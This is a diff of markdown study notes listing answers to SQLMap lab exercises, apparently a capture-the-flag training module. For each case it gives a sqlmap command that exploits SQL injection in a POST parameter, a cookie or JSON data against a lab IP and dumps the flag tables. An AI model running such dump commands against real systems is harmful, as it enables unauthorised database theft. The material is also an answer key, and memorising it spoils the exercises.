@@ -112,11 +112,11 @@ Columns
 
 
 
-### ANSWERS SQLMap ESSENTIALS
-What's the contents of table flag2? (Case #2) = Detect and exploit SQLi vulnerability in POST parameter id
-sqlmap -u http://167.71.128.18:30210/case2.php? --data 'id=1' --batch --dump
-What's the contents of table flag3? (Case #3) = Detect and exploit SQLi vulnerability in Cookie value id=1
-sqlmap -u http://167.71.128.18:30210/case3.php? --cookie='id=1*' --batch --dump
+### ANSWERS SQLMap ESSENTIALS  
+*What's the contents of table flag2? (Case #2) = Detect and exploit SQLi vulnerability in POST parameter id  
+sqlmap -u http://167.71.128.18:30210/case2.php? --data 'id=1' --batch --dump  
+*What's the contents of table flag3? (Case #3) = Detect and exploit SQLi vulnerability in Cookie value id=1  
+sqlmap -u http://167.71.128.18:30210/case3.php? --cookie='id=1*' --batch --dump  
 + 1  What's the contents of table flag4? (Case #4) = Detect and exploit SQLi vulnerability in JSON data {"id": 1}
 sqlmap -u http://167.71.128.18:30210/case4.php? --batch --data {'"id": 1'} --dump
  What's the contents of table flag5? (Case #5) = Detect and exploit (OR) SQLi vulnerability in GET parameter id
